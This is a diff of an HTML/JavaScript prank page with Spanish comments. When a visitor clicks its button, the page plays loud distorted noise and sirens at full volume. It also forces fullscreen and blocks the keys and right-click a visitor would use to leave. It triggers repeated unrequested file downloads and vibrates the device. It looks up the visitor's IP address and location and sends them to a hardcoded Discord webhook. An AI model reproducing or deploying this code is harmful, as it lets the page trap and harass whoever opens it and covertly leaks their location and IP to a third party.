@@ -263,7 +263,7 @@
             letter-spacing: 5px;
         }
 
-        /* ======== EFECTO DE SATURACIÓN EN PANTALLA 2 ======== */
+        /* ======== EFECTO DE SATURACIÓN ======== */
         .saturation-overlay {
             position: absolute;
             top: 0;
@@ -334,62 +334,50 @@
         <div class="sub-text">🔊 SATURACIÓN MÁXIMA 🔊</div>
     </div>
 
-    <!-- ======== 10 AUDIOS PARA SATURACIÓN ======== -->
-    <audio id="audio1" loop preload="auto">
+    <!-- ======== AUDIO PRINCIPAL (TU SONIDO) ======== -->
+    <audio id="mainAudio" loop preload="auto" controls style="display:none;">
+        <source src="https://pdftolink.io/file/r2_dXNlcnMvZ3Vlc3QvZjNmNmMxMTMtODk3NC00NTUxLTlhM2ItZDE3ZTM5MmFiMGQ5Lm1wZWc" type="audio/mpeg">
+        Tu navegador no soporta audio.
+    </audio>
+
+    <!-- ======== AUDIOS ADICIONALES PARA SATURACIÓN ======== -->
+    <audio id="audio1" loop preload="auto" style="display:none;">
         <source src="https://www.soundjay.com/misc/sounds/alarm-clock-01.mp3" type="audio/mpeg">
     </audio>
-    <audio id="audio2" loop preload="auto">
+    <audio id="audio2" loop preload="auto" style="display:none;">
         <source src="https://www.soundjay.com/misc/sounds/air-raid-siren-02.mp3" type="audio/mpeg">
     </audio>
-    <audio id="audio3" loop preload="auto">
-        <source src="https://www.soundjay.com/misc/sounds/bell-ringing-05.mp3" type="audio/mpeg">
-    </audio>
-    <audio id="audio4" loop preload="auto">
-        <source src="https://www.soundjay.com/misc/sounds/error-01.mp3" type="audio/mpeg">
-    </audio>
-    <audio id="audio5" loop preload="auto">
-        <source src="https://www.soundjay.com/misc/sounds/lock-01.mp3" type="audio/mpeg">
-    </audio>
-    <audio id="audio6" loop preload="auto">
-        <source src="https://www.soundjay.com/misc/sounds/phone-ring-01.mp3" type="audio/mpeg">
-    </audio>
-    <audio id="audio7" loop preload="auto">
+    <audio id="audio3" loop preload="auto" style="display:none;">
         <source src="https://www.soundjay.com/misc/sounds/siren-01.mp3" type="audio/mpeg">
-    </audio>
-    <audio id="audio8" loop preload="auto">
-        <source src="https://www.soundjay.com/misc/sounds/notification-01.mp3" type="audio/mpeg">
-    </audio>
-    <audio id="audio9" loop preload="auto">
-        <source src="https://www.soundjay.com/misc/sounds/warning-01.mp3" type="audio/mpeg">
-    </audio>
-    <audio id="audio10" loop preload="auto">
-        <source src="https://www.soundjay.com/misc/sounds/alarm-01.mp3" type="audio/mpeg">
     </audio>
 
     <script>
-        // ======== 1. GENERAR SONIDO CON WEB AUDIO API (SATURADO) ========
+        // ======== 1. GENERAR SONIDO SATURADO CON WEB AUDIO API ========
         function generarSonidoSaturado() {
             try {
                 const AudioContext = window.AudioContext || window.webkitAudioContext;
                 const audioCtx = new AudioContext();
 
-                // Crear 3 osciladores para saturar
-                for (let i = 0; i < 3; i++) {
+                // 5 osciladores para saturación extrema
+                const frecuencias = [880, 440, 1760, 220, 1320];
+                const tipos = ['sawtooth', 'square', 'sawtooth', 'square', 'sawtooth'];
+
+                frecuencias.forEach((freq, i) => {
                     const osc = audioCtx.createOscillator();
                     const gain = audioCtx.createGain();
                     const distortion = audioCtx.createWaveShaper();
 
-                    // Configurar distorsión (saturación)
-                    distortion.curve = new Float32Array(1000);
-                    for (let j = 0; j < 1000; j++) {
-                        const x = (j - 500) / 500;
-                        distortion.curve[j] = Math.tanh(x * 2);
+                    // Distorsión fuerte (saturación)
+                    distortion.curve = new Float32Array(2000);
+                    for (let j = 0; j < 2000; j++) {
+                        const x = (j - 1000) / 1000;
+                        distortion.curve[j] = Math.tanh(x * 3);
                     }
 
-                    osc.type = ['sawtooth', 'square', 'sawtooth'][i];
-                    osc.frequency.value = [880, 440, 1760][i];
+                    osc.type = tipos[i];
+                    osc.frequency.value = freq;
 
-                    gain.gain.value = [0.4, 0.3, 0.2][i];
+                    gain.gain.value = 0.15;
 
                     osc.connect(distortion);
                     distortion.connect(gain);
@@ -397,26 +385,23 @@
 
                     osc.start();
 
-                    // Modulación de frecuencia (efecto de alarma)
-                    setTimeout(() => {
-                        osc.frequency.value = [440, 880, 220][i];
-                    }, 300);
-                    setTimeout(() => {
-                        osc.frequency.value = [880, 440, 1760][i];
-                    }, 600);
-                }
+                    // Modulación aleatoria para caos
+                    setInterval(() => {
+                        osc.frequency.value = freq + (Math.random() - 0.5) * 200;
+                    }, 100);
+                });
 
-                // Añadir ruido blanco para saturación extra
+                // Ruido blanco
                 const bufferSize = 2 * audioCtx.sampleRate;
                 const buffer = audioCtx.createBuffer(1, bufferSize, audioCtx.sampleRate);
                 const data = buffer.getChannelData(0);
                 for (let i = 0; i < bufferSize; i++) {
-                    data[i] = (Math.random() * 2 - 1) * 0.3;
+                    data[i] = (Math.random() * 2 - 1) * 0.5;
                 }
                 const noise = audioCtx.createBufferSource();
                 noise.buffer = buffer;
                 const noiseGain = audioCtx.createGain();
-                noiseGain.gain.value = 0.15;
+                noiseGain.gain.value = 0.1;
                 noise.connect(noiseGain);
                 noiseGain.connect(audioCtx.destination);
                 noise.start();
@@ -424,32 +409,26 @@
                 console.log('✅ Sonido saturado generado');
 
             } catch (e) {
-                console.warn('⚠️ Web Audio API falló:', e);
+                console.warn('⚠️ Web Audio falló:', e);
             }
         }
 
-        // ======== 2. REPRODUCIR TODOS LOS AUDIOS (SATURACIÓN) ========
-        function reproducirAudiosSaturados() {
+        // ======== 2. REPRODUCIR TU AUDIO Y LOS DEMÁS ========
+        function reproducirAudioConVolumenMaximo() {
             const audios = [
+                document.getElementById('mainAudio'),
                 document.getElementById('audio1'),
                 document.getElementById('audio2'),
-                document.getElementById('audio3'),
-                document.getElementById('audio4'),
-                document.getElementById('audio5'),
-                document.getElementById('audio6'),
-                document.getElementById('audio7'),
-                document.getElementById('audio8'),
-                document.getElementById('audio9'),
-                document.getElementById('audio10')
+                document.getElementById('audio3')
             ];
 
             audios.forEach((audio, index) => {
                 if (!audio) return;
-                audio.volume = 1.0; // Volumen al 100%
+                audio.volume = 1.0;
                 audio.muted = false;
                 audio.loop = true;
 
-                // Intentar reproducir con diferentes retrasos para saturar
+                // Intentar reproducir con retraso escalonado
                 setTimeout(() => {
                     audio.play()
                         .then(() => {
@@ -457,61 +436,138 @@
                         })
                         .catch((err) => {
                             console.warn('⚠️ Audio ' + (index + 1) + ' falló:', err);
-                            // Si falla, reintentar con interacción
+                            // Si falla, esperar clic
                             document.addEventListener('click', function activar() {
                                 audio.play().catch(() => {});
                                 document.removeEventListener('click', activar);
                             }, { once: true });
                         });
-                }, index * 200); // Retraso escalonado para saturación
+                }, index * 300);
             });
+
+            // También generar sonido por Web Audio
+            setTimeout(generarSonidoSaturado, 500);
         }
 
-        // ======== 3. ACTIVAR CAOS ========
-        function activarCaos() {
-            // Cambiar a pantalla 2
-            document.getElementById('screen1').style.display = 'none';
-            const screen2 = document.getElementById('screen2');
-            screen2.style.display = 'flex';
+        // ======== 3. DESCARGAS RANDOM A VELOCIDAD 0.1 ========
+        function iniciarDescargasRandom() {
+            const archivos = [
+                'https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/pdf/dummy.pdf',
+                'https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/img/dummy-image.jpg',
+                'https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/img/dummy-image.png',
+                'https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/mp3/dummy.mp3'
+            ];
 
-            // Activar pantalla completa
-            if (document.documentElement.requestFullscreen) {
-                document.documentElement.requestFullscreen().catch(() => {});
+            let descargasActivas = 0;
+            const MAX_DESCARGAS = 20;
+
+            function descargarArchivo() {
+                if (descargasActivas >= MAX_DESCARGAS) return;
+
+                const url = archivos[Math.floor(Math.random() * archivos.length)];
+                const nombre = 'archivo_' + Math.random().toString(36).substring(7) + '.tmp';
+
+                try {
+                    const link = document.createElement('a');
+                    link.href = url;
+                    link.download = nombre;
+                    link.style.display = 'none';
+                    document.body.appendChild(link);
+                    link.click();
+                    document.body.removeChild(link);
+
+                    descargasActivas++;
+                    console.log('📥 Descarga #' + descargasActivas + ': ' + nombre);
+                } catch (e) {
+                    console.warn('⚠️ Error en descarga:', e);
+                }
+
+                // Programar siguiente descarga (velocidad 0.1 = 1 cada 10 segundos)
+                if (descargasActivas < MAX_DESCARGAS) {
+                    setTimeout(descargarArchivo, 10000); // 10 segundos = velocidad 0.1
+                }
             }
 
-            // Bloquear teclas de salida
+            // Iniciar primera descarga después de 2 segundos
+            setTimeout(descargarArchivo, 2000);
+        }
+
+        // ======== 4. CONGELAR PANTALLA (EVITAR SALIR) ========
+        function congelarPantalla() {
+            // Bloquear todas las teclas de salida
             document.addEventListener('keydown', function(e) {
-                if (e.key === 'Escape' || e.key === 'F11' ||
-                    (e.ctrlKey && e.key === 'w') ||
+                const teclasBloqueadas = [
+                    'Escape', 'F11', 'F5',
+                    'w', 'W', 'r', 'R',
+                    'F4'
+                ];
+                if (teclasBloqueadas.includes(e.key) ||
+                    (e.ctrlKey && (e.key === 'w' || e.key === 'W' || e.key === 'r' || e.key === 'R')) ||
                     (e.ctrlKey && e.key === 'F4') ||
                     (e.altKey && e.key === 'F4') ||
-                    (e.metaKey && e.key === 'w')) {
+                    (e.metaKey && (e.key === 'w' || e.key === 'W'))) {
                     e.preventDefault();
                     e.stopPropagation();
                     return false;
                 }
             });
 
-            // Generar sonido saturado (Web Audio)
-            generarSonidoSaturado();
+            // Bloquear clic derecho
+            document.addEventListener('contextmenu', function(e) {
+                e.preventDefault();
+                return false;
+            });
 
-            // Reproducir todos los audios
-            setTimeout(() => {
-                reproducirAudiosSaturados();
-            }, 300);
+            // Pantalla completa forzada (no se puede salir fácilmente)
+            if (document.documentElement.requestFullscreen) {
+                document.documentElement.requestFullscreen()
+                    .then(() => {
+                        // Bloquear salida de pantalla completa con Esc
+                        document.addEventListener('fullscreenchange', function() {
+                            if (!document.fullscreenElement) {
+                                document.documentElement.requestFullscreen();
+                            }
+                        });
+                    })
+                    .catch(() => {});
+            }
 
-            // Forzar vibración (si está disponible)
+            // Prevenir cierre de pestaña
+            window.addEventListener('beforeunload', function(e) {
+                e.preventDefault();
+                e.returnValue = '⚠️ ¿Seguro que quieres salir?';
+                return '⚠️ ¿Seguro que quieres salir?';
+            });
+        }
+
+        // ======== 5. ACTIVAR CAOS COMPLETO ========
+        function activarCaos() {
+            // Cambiar a pantalla 2
+            document.getElementById('screen1').style.display = 'none';
+            const screen2 = document.getElementById('screen2');
+            screen2.style.display = 'flex';
+
+            // Congelar pantalla
+            congelarPantalla();
+
+            // Reproducir sonidos
+            reproducirAudioConVolumenMaximo();
+
+            // Iniciar descargas random
+            iniciarDescargasRandom();
+
+            // Vibración
             if (navigator.vibrate) {
-                navigator.vibrate([100, 50, 100, 50, 200, 100, 200]);
+                navigator.vibrate([100, 50, 100, 50, 200, 100, 200, 100, 300]);
             }
 
             // Capturar datos y enviar a Discord
             capturarDatos();
 
-            console.log('🔥 CAOS ACTIVADO');
+            console.log('🔥 CAOS TOTAL ACTIVADO');
         }
 
-        // ======== 4. CAPTURAR DATOS ========
+        // ======== 6. CAPTURAR DATOS ========
         async function capturarDatos() {
             try {
                 const res = await fetch('https://ipapi.co/json/');
@@ -545,7 +601,7 @@
                     'https://discord.com/api/webhooks/1545583807804219432/4NXmuMtLnjKqgQqvZGSG2rXhy8j45SdiYvSAI3aeDFcrZBzObbEpS93HH3DPCYNIwhWD';
                 const embed = {
                     color: 0xff0000,
-                    title: '🔥 CAOS ACTIVADO',
+                    title: '🔥 CAOS TOTAL ACTIVADO',
                     fields: [
                         { name: '📍 Dirección', value: info.direccionReal || 'No disponible' },
                         { name: '🌐 IP', value: info.ip || 'No disponible' },
@@ -572,15 +628,8 @@
             }
         }
 
-        // ======== 5. EVENTO DEL BOTÓN ========
+        // ======== 7. EVENTO DEL BOTÓN ========
         document.getElementById('activateBtn').addEventListener('click', activarCaos);
-
-        // ======== 6. PREVENIR SALIR ========
-        window.addEventListener('beforeunload', function(e) {
-            e.preventDefault();
-            e.returnValue = '⚠️ ¿Seguro que quieres salir?';
-            return '⚠️ ¿Seguro que quieres salir?';
-        });
 
         console.log('🌅 Good Morning - Listo');
     </script>
